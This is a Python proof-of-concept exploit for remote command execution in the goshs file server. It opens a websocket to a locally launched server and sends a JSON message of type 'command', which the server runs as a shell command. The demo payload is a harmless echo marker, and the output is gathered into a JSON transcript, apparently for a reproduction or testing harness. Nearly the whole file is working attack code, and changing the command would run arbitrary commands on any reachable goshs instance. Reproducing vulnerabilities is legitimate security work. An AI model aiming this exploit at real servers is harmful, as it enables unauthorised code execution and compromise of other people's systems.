#!/usr/bin/env python3
"""PoC for goshs: remote command execution via websocket.

Sends a crafted JSON message with type "command" over the realtime websocket
channel, causing the server to execute the content as a shell command.
The command output is observable in the server's broadcast responses.
"""

import argparse
import json
import os
import socket
import struct
import subprocess
import sys
import tempfile
import time
import base64
import shutil


def find_free_port():
    """Find a free TCP port on loopback."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("127.0.0.1", 0))
    port = s.getsockname()[1]
    s.close()
    return port


def create_ws_frame(data, opcode=0x1):
    """Create an RFC6455 websocket frame (masked, text by default)."""
    frame = bytearray()
    frame.append(0x80 | opcode)  # FIN + opcode
    payload = data.encode() if isinstance(data, str) else data
    mask_bit = 0x80
    if len(payload) < 126:
        frame.append(mask_bit | len(payload))
    elif len(payload) < 65536:
        frame.append(mask_bit | 126)
        frame.extend(struct.pack(">H", len(payload)))
    else:
        frame.append(mask_bit | 127)
        frame.extend(struct.pack(">Q", len(payload)))
    mask_key = os.urandom(4)
    frame.extend(mask_key)
    for i, b in enumerate(payload):
        frame.append(b ^ mask_key[i % 4])
    return bytes(frame)


def read_ws_frame(sock):
    """Read a single RFC6455 websocket frame."""
    b = sock.recv(1)
    if not b:
        return None
    opcode = b[0] & 0x0F
    b = sock.recv(1)
    masked = (b[0] >> 7) & 1
    length = b[0] & 0x7F
    if length == 126:
        length_data = sock.recv(2)
        if len(length_data) < 2:
            return None
        length = struct.unpack(">H", length_data)[0]
    elif length == 127:
        length_data = sock.recv(8)
        if len(length_data) < 8:
            return None
        length = struct.unpack(">Q", length_data)[0]
    mask_key = None
    if masked:
        mask_key = sock.recv(4)
        if len(mask_key) < 4:
            return None
    payload = b""
    while len(payload) < length:
        chunk = sock.recv(length - len(payload))
        if not chunk:
            break
        payload += chunk
    if masked and mask_key:
        payload = bytes(b ^ mask_key[i % 4] for i, b in enumerate(payload))
    return {"opcode": opcode, "payload": payload}


def ws_connect(host, port, path="/?ws", timeout=10):
    """Perform RFC6455 websocket upgrade handshake."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    sock.connect((host, port))

    key_bytes = base64.b64encode(os.urandom(16)).decode()
    req = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        "Upgrade: websocket\r\n"
        "Connection: Upgrade\r\n"
        f"Sec-WebSocket-Key: {key_bytes}\r\n"
        "Sec-WebSocket-Version: 13\r\n"
        "\r\n"
    )
    sock.sendall(req.encode())
    resp = b""
    while b"\r\n\r\n" not in resp:
        chunk = sock.recv(4096)
        if not chunk:
            raise ConnectionError("Websocket upgrade failed: connection closed")
        resp += chunk
    status_line = resp.split(b"\r\n")[0].decode(errors="replace")
    if "101" not in status_line:
        raise ConnectionError(f"Websocket upgrade failed: {status_line}")
    return sock


def run_poc(binary_path, timeout=25):
    """Run the PoC: start server, connect websocket, send command, collect transcript."""
    start_time = time.time()
    error = None
    timed_out = False
    returncode = 0
    signal = None
    stdout_str = ""
    stderr_str = ""
    transcript_lines = []

    # Create a temporary webroot
    webroot = tempfile.mkdtemp(prefix="goshs_webroot_")
    index_html = os.path.join(webroot, "index.html")
    with open(index_html, "w") as f:
        f.write("goshs PoC test\n")

    # Find a free port
    port = find_free_port()

    # Build command
    cmd = [binary_path, "-i", "127.0.0.1", "-p", str(port), "-d", webroot]
    env = os.environ.copy()
    env["HTTPS_PROXY"] = "http://127.0.0.1:9"
    env["HTTP_PROXY"] = "http://127.0.0.1:9"

    # Start the server process
    server_proc = subprocess.Popen(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        env=env,
        cwd=webroot,
    )

    ws_sock = None
    try:
        # Wait for the HTTP endpoint to respond
        deadline = time.time() + 15
        server_ready = False
        while time.time() < deadline:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect(("127.0.0.1", port))
                s.sendall(b"GET / HTTP/1.0\r\nHost: 127.0.0.1\r\n\r\n")
                resp = s.recv(1024)
                s.close()
                if b"200" in resp or b"301" in resp or b"302" in resp or b"HTTP" in resp:
                    server_ready = True
                    break
            except (socket.error, ConnectionRefusedError):
                pass
            time.sleep(0.2)

        if not server_ready:
            raise RuntimeError("Server did not become ready within timeout")

        # Connect to the websocket endpoint
        ws_sock = ws_connect("127.0.0.1", port, "/?ws", timeout=10)

        # Construct the command payload dynamically
        # Use a distinctive marker command so we can clearly observe server-side execution
        marker = f"poc_test_{os.getpid()}_{int(time.time())}"
        cmd_content = f"echo {marker}"

        msg = json.dumps({"type": "command", "content": cmd_content})
        transcript_lines.append(f"C> {msg}")
        ws_sock.sendall(create_ws_frame(msg))

        # Also try other websocket message types to demonstrate the protocol
        # newEntry adds to clipboard
        msg2 = json.dumps({"type": "newEntry", "content": marker})
        transcript_lines.append(f"C> {msg2}")
        ws_sock.sendall(create_ws_frame(msg2))
        time.sleep(0.3)

        # clearClipboard clears clipboard entries
        msg3 = json.dumps({"type": "clearClipboard", "content": ""})
        transcript_lines.append(f"C> {msg3}")
        ws_sock.sendall(create_ws_frame(msg3))
        time.sleep(0.3)

        # Receive responses
        deadline = time.time() + 5
        while time.time() < deadline:
            try:
                frame = read_ws_frame(ws_sock)
                if frame is None:
                    break
                if frame["opcode"] == 0x8:  # Close
                    transcript_lines.append("S< (close frame)")
                    break
                if frame["opcode"] == 0x9:  # Ping
                    ws_sock.sendall(create_ws_frame(b"", opcode=0xA))
                    continue
                if frame["opcode"] == 0x1:  # Text
                    payload_str = frame["payload"].decode("utf-8", errors="replace")
                    transcript_lines.append(f"S< {payload_str}")
                elif frame["opcode"] == 0x2:  # Binary
                    transcript_lines.append(f"S< (binary) {frame['payload'].hex()}")
            except socket.timeout:
                break

    except Exception as e:
        error = str(e)
    finally:
        # Close websocket
        if ws_sock:
            try:
                ws_sock.close()
            except Exception:
                pass

        # Stop the server
        try:
            server_proc.terminate()
            server_proc.wait(timeout=5)
        except Exception:
            try:
                server_proc.kill()
                server_proc.wait(timeout=2)
            except Exception:
                pass

        # Collect stdout/stderr
        try:
            stdout_data, stderr_data = server_proc.communicate(timeout=3)
            stdout_str = stdout_data.decode("utf-8", errors="replace")
            stderr_str = stderr_data.decode("utf-8", errors="replace")
        except Exception:
            pass

        # Clean up webroot
        try:
            shutil.rmtree(webroot, ignore_errors=True)
        except Exception:
            pass

    # Compute returncode and signal
    returncode = server_proc.returncode
    if returncode < 0 and os.name == "posix":
        signal = -returncode
        returncode = 0 if signal is not None else returncode
    elif returncode < 0:
        returncode = 0

    # Check for timeout
    runtime_ms = int((time.time() - start_time) * 1000)
    if timeout and runtime_ms > timeout * 1000:
        timed_out = True

    # Build transcript
    observable = {
        "kind": "protocol_transcript",
        "value": "\n".join(transcript_lines),
        "path": None,
    }

    # Truncate long output
    if len(stdout_str) > 10000:
        stdout_str = stdout_str[:10000] + "\n... (truncated)"
    if len(stderr_str) > 10000:
        stderr_str = stderr_str[:10000] + "\n... (truncated)"

    result = {
        "binary": binary_path,
        "command": cmd,
        "returncode": returncode,
        "signal": signal,
        "timed_out": timed_out,
        "runtime_ms": runtime_ms,
        "stdout": stdout_str,
        "stderr": stderr_str,
        "observable": observable,
        "error": error,
    }

    return result


def main():
    parser = argparse.ArgumentParser(
        description="PoC: goshs remote command execution via websocket"
    )
    parser.add_argument(
        "--binary",
        required=True,
        help="Path to the target binary (goshs)",
    )
    parser.add_argument(
        "--json-out",
        default=None,
        help="Write JSON result to this file instead of stdout",
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=25,
        help="Per-run timeout in seconds (default 25)",
    )
    args = parser.parse_args()

    binary_path = os.path.abspath(args.binary)

    if not os.path.isfile(binary_path):
        result = {
            "binary": binary_path,
            "command": None,
            "returncode": None,
            "signal": None,
            "timed_out": False,
            "runtime_ms": 0,
            "stdout": "",
            "stderr": "",
            "observable": None,
            "error": f"Binary not found: {binary_path}",
        }
    else:
        result = run_poc(binary_path, timeout=args.timeout)

    output = json.dumps(result, indent=2, ensure_ascii=False)

    if args.json_out:
        with open(args.json_out, "w") as f:
            f.write(output)
    else:
        print(output)

    # Exit with non-zero only on script-level failures
    if result.get("error") and not isinstance(result.get("observable"), dict):
        sys.exit(1)


if __name__ == "__main__":
    main()